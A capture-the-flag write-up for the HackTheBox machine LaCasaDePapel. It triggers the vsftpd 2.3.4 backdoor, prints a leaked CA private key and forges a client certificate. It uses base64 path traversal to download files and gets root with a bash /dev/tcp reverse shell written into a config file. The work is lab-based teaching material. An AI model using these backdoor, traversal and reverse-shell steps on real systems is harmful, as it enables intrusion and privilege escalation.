# LaCasaDePapel Writeup w/o Metasploit

![](https://miro.medium.com/max/593/1*haljsvScci8hHcrU5AL29g.png)

## Reconnaissance <a id="1102"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.131 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.131Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:07 EST
Warning: 10.10.10.131 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.131
Host is up (0.039s latency).
Not shown: 907 closed ports, 89 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  httpsNmap done: 1 IP address (1 host up) scanned in 3.10 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:07 EST
Nmap scan report for 10.10.10.131
Host is up (0.40s latency).PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js Express framework
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.35 secondsOS Detection modified to: Unix----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:07 EST
Warning: 10.10.10.131 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.131
Host is up (0.23s latency).
All 1000 scanned ports on 10.10.10.131 are closed (656) or open|filtered (344)Nmap done: 1 IP address (1 host up) scanned in 703.42 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:19 EST
Initiating Parallel DNS resolution of 1 host. at 20:19
Completed Parallel DNS resolution of 1 host. at 20:19, 0.03s elapsed
Initiating SYN Stealth Scan at 20:19
Scanning 10.10.10.131 [65535 ports]
Discovered open port 443/tcp on 10.10.10.131
Discovered open port 22/tcp on 10.10.10.131
Discovered open port 80/tcp on 10.10.10.131
Discovered open port 21/tcp on 10.10.10.131
Warning: 10.10.10.131 giving up on port because retransmission cap hit (1).
SYN Stealth Scan Timing: About 19.34% done; ETC: 20:22 (0:02:09 remaining)
SYN Stealth Scan Timing: About 39.16% done; ETC: 20:22 (0:01:35 remaining)
SYN Stealth Scan Timing: About 58.97% done; ETC: 20:22 (0:01:03 remaining)
SYN Stealth Scan Timing: About 78.28% done; ETC: 20:22 (0:00:34 remaining)
Completed SYN Stealth Scan at 20:22, 180.10s elapsed (65535 total ports)
Nmap scan report for 10.10.10.131
Host is up (0.036s latency).
Not shown: 63128 closed ports, 2403 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  httpsRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 180.23 seconds
           Raw packets sent: 89267 (3.928MB) | Rcvd: 79771 (3.191MB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                        
Running CVE scan on basic ports
                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:22 EST
Nmap scan report for 10.10.10.131
Host is up (0.17s latency).PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
80/tcp  open  http     Node.js (Express middleware)
443/tcp open  ssl/http Node.js Express framework
Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.49 secondsRunning Vuln scan on basic ports
                                                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:23 EST
Nmap scan report for 10.10.10.131
Host is up (0.41s latency).PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9: 
|_      CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
80/tcp  open  http     Node.js (Express middleware)
|.....
443/tcp open  ssl/http Node.js Express framework
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|.....
Service Info: OS: UnixService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.80 seconds
....
```

We have four ports open.

* **Port 21:** running vsftpd 2.3.4
* **Port 22:** running OpenSSH 7.9
* **Port 80:** running Node.js over HTTP
* **Port 443:** running Node.js over HTTPS

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The vsftpd version running is associated with a backdoor command execution vulnerability. Although I’m pretty sure that the nmap _vuln_ scan does test for this CVE, from past experience it almost always reports it as a false negative. Therefore, I always check for this vulnerability manually.
* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 80 & 443 are running the Node.js Express framework. Port 80 returns a 200 status code whereas port 443 returns a 401 status code. Since they’re returning different codes, we’ll have to enumerate both of them.
* The nmap scan leaks the domain name _lacasadepapel.htb_. We’ll have to add that to our _/etc/hosts_ file.
* I terminated the nikto and gobuster scans because they were taking too long to run and weren’t generating any useful results. For this box, the enumeration will be a little bit more manual.

## Enumeration <a id="8fad"></a>

Add the domain name to the _/etc/hosts_ file.

```text
10.10.10.131    lacasadepapel.htb
```

I always start off with enumerating HTTP.

**Port 80 HTTP**

Visit the web application.

![](https://miro.medium.com/max/1250/1*rXgmYgwIuWCImWIUvzU69Q.png)

View the page source. We don’t get anything useful. Next, play around with the E-MAIL and ONE PASSWORD field. There doesn’t seem to be anything unusual there, so let’s move on to the next port.

**Port 443 HTTPS**

Visit the web application.

![](https://miro.medium.com/max/1251/1*eNTSIU8B-YnZNzqx_HlUyw.png)

We get a certificate error informing us that we need to provide a client certificate before we can view any other content. Interesting. This is the first time I encounter an HTB machine that is using mutual TLS authentication.

If you don’t know what that is, here is a quick run down. Every time you use a web browser to connect to an HTTPS site, you’re using a cryptographic protocol known as Transport Layer Security \(TLS\) or it’s predecessor SSL. SSL/TLS guarantees that all communication between your web browser and the server you’re connecting to is encrypted, thereby preventing an attacker from reading or modifying the communication. This is done through the use of SSL certificates which are installed on the server. When your browser connects to a server, the server sends its certificate to the browser, the browser checks the validity of the certificate and if all is good, a secure session is established between the two parties.

In the above scenario \(which is the default functionality\), the server proves its identity to the client \(browser\). It is possible to add additional security by also enabling client-to-server authentication, where the client also needs to prove its identity to the server. In order to do that, the client has to provide the server with a certificate.

How does this work? Here’s a [good article that explains it](https://blog.codeship.com/how-to-set-up-mutual-tls-authentication/). The bottom line is if we get hold of the Certificate Authority’s \(CA\) private key, we can generate a client side certificate and authenticate to the server. We’ll keep that in mind while enumerating the host.

Next, let’s view the page source to see if it leaks any information. We don’t get anything useful. Similarly, the certificate used by the site doesn’t leak any sensitive information.

Let’s move on to the next port.

**Port 21 VSFTPD**

A quick google search shows us that this version of vsftpd is famously vulnerable to a backdoor command execution that is triggered by entering a string that contains the characters “:\)” as the username. When the backdoor is triggered, the target machine opens a shell on port 6200.

This exploit is simple enough to exploit manually.

```text
root@kali:~# ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:root): random:)
331 Please specify the password.
Password:
^C
421 Service not available, remote server has closed connection
```

This should have triggered the backdoor. Run a quick nmap scan to see if port 6200 opened up.

```text
root@kali:~# nmap -p 6200 10.10.10.131
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-21 19:48 EST
Nmap scan report for lacasadepapel.htb (10.10.10.131)
Host is up (0.073s latency).PORT     STATE SERVICE
6200/tcp open  lm-xNmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

Perfect! Connect to the port using netcat.

```text
root@kali:~# nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```

We’re in! It’s a psy shell, which is a PHP shell.

Run the “_?_” command to see which commands we’re allowed to run.

![](https://miro.medium.com/max/983/1*rwPT_vCMVzPCN2HRgGAfZQ.png)

Let’s run the _ls_ command.

```text
ls
Variables: $tokyo
```

There’s a set variable _$tokyo_. Let’s view it using the _show_ command.

![](https://miro.medium.com/max/851/1*Ty9WzApObe2U9t4KFLz6uA.png)

We get the path to the Certificate Authority \(CA\) key! Let’s dump the content of the file.

```text
file_get_contents('/home/nairobi/ca.key');
=> """
-----BEGIN PRIVATE KEY-----
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRluXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8MYQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyps2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+UsPCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3VDj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU891+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mruaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVdI0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bEG3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmnsqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDHCTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Ysm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNIikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9MWGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsRaRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
   """
```

Before we use the key to generate a client side cert, let’s see what other information we can gather from this shell.

```text
file_get_contents('/etc/passwd');
=> """
   root:x:0:0:root:/root:/bin/ash\n
   bin:x:1:1:bin:/bin:/sbin/nologin\n
   daemon:x:2:2:daemon:/sbin:/sbin/nologin\n
   adm:x:3:4:adm:/var/adm:/sbin/nologin\n
   lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n
   sync:x:5:0:sync:/sbin:/bin/sync\n
   shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n
   halt:x:7:0:halt:/sbin:/sbin/halt\n
   mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n
   news:x:9:13:news:/usr/lib/news:/sbin/nologin\n
   uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\n
   operator:x:11:0:operator:/root:/bin/sh\n
   man:x:13:15:man:/usr/man:/sbin/nologin\n
   postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\n
   cron:x:16:16:cron:/var/spool/cron:/sbin/nologin\n
   ftp:x:21:21::/var/lib/ftp:/sbin/nologin\n
   sshd:x:22:22:sshd:/dev/null:/sbin/nologin\n
   at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\n
   squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\n
   xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\n
   games:x:35:35:games:/usr/games:/sbin/nologin\n
   postgres:x:70:70::/var/lib/postgresql:/bin/sh\n
   cyrus:x:85:12::/usr/cyrus:/sbin/nologin\n
   vpopmail:x:89:89::/var/vpopmail:/sbin/nologin\n
   ntp:x:123:123:NTP:/var/empty:/sbin/nologin\n
   smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\n
   guest:x:405:100:guest:/dev/null:/sbin/nologin\n
   nobody:x:65534:65534:nobody:/:/sbin/nologin\n
   chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin\n
   dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh\n
   berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash\n
   professor:x:1002:1002:professor,,,:/home/professor:/bin/ash\n
   vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin\n
   memcached:x:102:102:memcached:/home/memcached:/sbin/nologin\n
   """
```

The only user’s that have shells are _professor_, _berlin_, _dali,_ _postgres_, _operator_ and _root_. We can safely deduce that we’re running as _dali_ since this is the only user that is assigned the _/usr/bin/psysh_ shell.

Let’s see what’s in the home directory using the _scandir\(\)_ function.

```text
scandir('/home')
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]scandir('/home/berlin')
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]file_get_contents('/home/berlin/user.txt')
PHP Warning:  file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1file_get_contents('/home/berlin/.ssh')
PHP Warning:  file_get_contents(/home/berlin/.ssh): failed to open stream: Permission denied in phar://eval()'d code on line 1
```

The user.txt flag is in _berlin’s_ directory. So we need to figure out a way to own that user.

## Initial Foothold <a id="dab5"></a>

Let’s go back to the _ca.key_ we found. A quick google search on “_generate client side ssl certificate_” gives you [this result](https://www.makethenmakeinstall.com/2014/05/ssl-client-authentication-step-by-step/). We already have a certificate authority, so all we need to do is follow the **Generate a client SSL certificate** section of the article.

First, let’s download the server side certificate from the browser. Click on the Lock icon &gt; _Show Connect Details_ &gt; _More Information_ &gt; _View Certificate_ &gt; _Details_ &gt; _Export_.

```text
root@kali:~/Desktop/htb/lacasadepapel/certs# ls                                                                           
ca.key  lacasadepapel_htb.crt
```

So now we have the certificate authority key \(ca.key\) and the certificate that the server is using. Let’s confirm that the CA key we have was used to sign the server certificate. This can be done by verifying that the public key of ca.key is the same as the public key of server certificate.

```text
root@kali:~/Desktop/htb/lacasadepapel/certs# openssl pkey -in ca.key -pubout | md5sum
71e2b2ca7b610c24d132e3e4c06daf0c  -root@kali:~/Desktop/htb/lacasadepapel/certs# openssl x509 -in lacasadepapel_htb.crt -pubkey -noout | md5sum
71e2b2ca7b610c24d132e3e4c06daf0c  -
```

Now let’s generate the client certificate.

First, generate a private key for the SSL client.

```text
openssl genrsa -out client.key 4096
```

Use the client’s private key to generate a cert request.

```text
openssl req -new -key client.key -out client.req
```

You’ll be prompted to enter the following information.

```text
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:bl
State or Province Name (full name) [Some-State]:bla  
Locality Name (eg, city) []:bla
Organization Name (eg, company) [Internet Widgits Pty Ltd]:bla.com
Organizational Unit Name (eg, section) []:bla
Common Name (e.g. server FQDN or YOUR name) []:bla.co
Email Address []:bla@bla.caPlease enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Issue the client certificate using the cert request and the CA cert/key.

```text
openssl x509 -req -in client.req -CA lacasadepapel_htb.crt -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
```

Convert the client certificate and private key to pkcs\#12 format for use by browsers.

```text
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```

You’ll be prompted for an export password. This is optional when importing into the browser, however, it’s mandatory in Burp to provide a password, therefore, let’s set the password as “_password_”.

Now we need to import the client certificate into our browser. To do that click on the hamburger icon &gt; _Preferences_ &gt; __search for _Certificates_ &gt;_View Certificates_ &gt; _Your Certificates_ &gt; _Import_.

![](https://miro.medium.com/max/677/1*4q84idVkAzS6pEhG8GQWBQ.png)

In the above _Certificate Manager_ window, click on the _Authorities_ tab and find the _La Casa De Papel_ certificate authority.

![](https://miro.medium.com/max/672/1*j_kk0JtL88uXTJ8VrTahQg.png)

Click on _Edit Trust_ and select the option _This certificate can identify websites_. Then restart the browser and visit the page again. Now you’ll be prompted with a _User Identification Request_.

![](https://miro.medium.com/max/1124/1*iOgbIp56pz604YdvWpCeOQ.png)

Click _OK_ and we’re in!

![](https://miro.medium.com/max/1034/1*VoUWQ9ffTYqS8m4dEynlmg.png)

Click on _SEASON-1_.

![](https://miro.medium.com/max/1207/1*6TGMRlu4tvWrbXbHeMonmA.png)

It uses a _path_ parameter. Let’s see if it is vulnerable to LFI.

![](https://miro.medium.com/max/1037/1*LhefQ5kud5eAl1a1qcPomw.png)

It definitely is. However, when we try to view the _user.txt_ file, we get an error.

```text
https://lacasadepapel.htb/?path=../user.txt
```

Let’s go back to the SEASON-1 path. If we click on _01.avi_, we get prompted with a file download.

![](https://miro.medium.com/max/948/1*ycZ20B55HokT0rZhDHoJ6Q.png)

View the source code on the download link.

![](https://miro.medium.com/max/482/1*JwVXk3TtVPZ6bvPUvClA6w.png)

Notice that the _href_ attribute for _01.avi_ and _02.avi_ are very similar with only one character difference. Considering that the names of the files are also only slightly different, this leads me to believe that the file download link is dependant on the file name. It looks like base64 encoding, so let’s try decoding them.

```text
root@kali:~/Desktop/htb/lacasadepapel# echo "U0VBU090LTEvMDEuYXZp" | base64 --decode  
SEASOt-1/01.aviroot@kali:~/Desktop/htb/lacasadepapel# echo "U0VBU090LTEvMDIuYXZp" | base64 --decode  
SEASOt-1/02.avi
```

It’s simply base64 encoding the path to the file. Now that we know how the backend allows file downloads, let’s try to download the _user.txt_ file.

```text
root@kali:~/Desktop/htb/lacasadepapel/certs# echo -n "../user.txt" | base64
Li4vdXNlci50eHQ=
```

Open Burp and click on _User Options_ &gt; _SSL_ &gt; _Client SSL Certificates_ &gt; _Add._ In the _Destination host_ field, add _lacasadepapel.com_ and select the _File \(PKCS\#12\)_ option_._ Click _Next_ and import the client cert. Now, we can intercept requests using Burp.

Intercept the _01.avi_ file download request in Burp and change the base64 value to the one we generated for _user.txt._

![](https://miro.medium.com/max/764/1*-CXNJ-l6CU2nv6QyW6qyXA.png)

Forward the request. This prompts a download for the _user.txt_ file! Save the file and grab the _user.txt_ flag.

![](https://miro.medium.com/max/762/1*HjnDpjSd6ldu-p4lDBWCog.png)

We also noticed that there is a _.ssh_ directory that contains an ssh key.

![](https://miro.medium.com/max/1218/1*OI8Hnu_WqQX7V8aRyRIEPA.png)

In the same way we downloaded _user.txt_, we download the _id\_rsa_ file.

Change the permissions on the _id\_rsa_ file.

```text
chmod 600 id_rsa
```

Try to login into Berlin’s account.

```text
root@kali:~/Downloads# ssh -i id_rsa berlin@10.10.10.131
berlin@10.10.10.131's password: 
Permission denied, please try again.
berlin@10.10.10.131's password:
```

It doesn’t work. Let’s try other accounts.

```text
ssh -i id_rsa professor@10.10.10.131
```

![](https://miro.medium.com/max/640/1*4FdkepT51p13Oku42-xwZA.png)

We’re in! Now we need to escalate privileges.

## Privilege Escalation <a id="83dd"></a>

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the _/tmp_ directory where we have write privileges and download the _LinEnum_ script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We don’t get anything useful. Next, let’s try pspy64.

```text
2020/01/24 02:09:33 CMD: UID=65534 PID=4930   | /usr/bin/node /home/professor/memcached.js
```

It’s running this script every one minute. View permissions on the file.

```text
lacasadepapel [/tmp]$ ls -la /home/professor/
total 24
drwxr-sr-x    4 professo professo      4096 Mar  6  2019 .
drwxr-xr-x    7 root     root          4096 Feb 16  2019 ..
lrwxrwxrwx    1 root     professo         9 Nov  6  2018 .ash_history -> /dev/null
drwx------    2 professo professo      4096 Jan 31  2019 .ssh
-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules
```

We don’t have read, write or execute privileges on the _memcached.js_ file. However, notice that we have read access on the _memcached.ini_ file. Let’s view the content of the file.

```text
lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

It seems to be a configuration file that is running the sudo command on the _memcached.js_ file. Chances are it is running as root since only root has read/write access on it.

We can’t write to the file, however, we can overwrite it since we own the directory. First, copy the content of the file into a test file.

```text
cp memcached.ini test.ini
```

Then edit the _test.ini_ file to send a reverse shell back to our attack machine.

```text
[program:memcached]
command = bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
```

Change the name of the file to memcached.ini.

```text
mv test.ini memcached.ini
```

Now set up a listener on the attack machine and wait for the command to execute.

```text
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.131] 55244
bash: cannot set terminal process group (9460): Not a tty
bash: no job control in this shell
bash-4.4# whoami                                                                  
whoami
root
```

We are root! Grab the root.txt flag.

![](https://miro.medium.com/max/658/1*N1dDiAAacjYOIQ2h8VGXJw.png)

## Lessons Learned <a id="718d"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. FTP backdoor command execution. The FTP version used is famously known for its backdoor vulnerability. This allowed us to gain initial access on the machine. This could have been avoided if the administrator had patched the system and installed the most recent version of vsftpd.

To escalate privileges we exploited three vulnerabilities.

1. Loose permissions and insecure storage of Certificate Authority \(CA\) key. Once we had initial access on the machine we were able to download the CA key. This in turn allowed us to create a client side certificate and authenticate to the server. The administrator should have secured the CA key by restricting access to it and encrypting it.
2. Local File Inclusion \(LFI\) vulnerability that allowed us to view files on the host. Using this vulnerability, we were able to find and view the SSH private key of the _professor_ user. This could have been easily avoided if the developer properly validated user input.
3. Security misconfiguration of a scheduled task. The task was being run with root privileges using a file that is in a directory owned by a non-privileged user. Since the non-privileged user owned the directory, we were able to simply overwrite the file with a malicious one that contained a reverse shell.

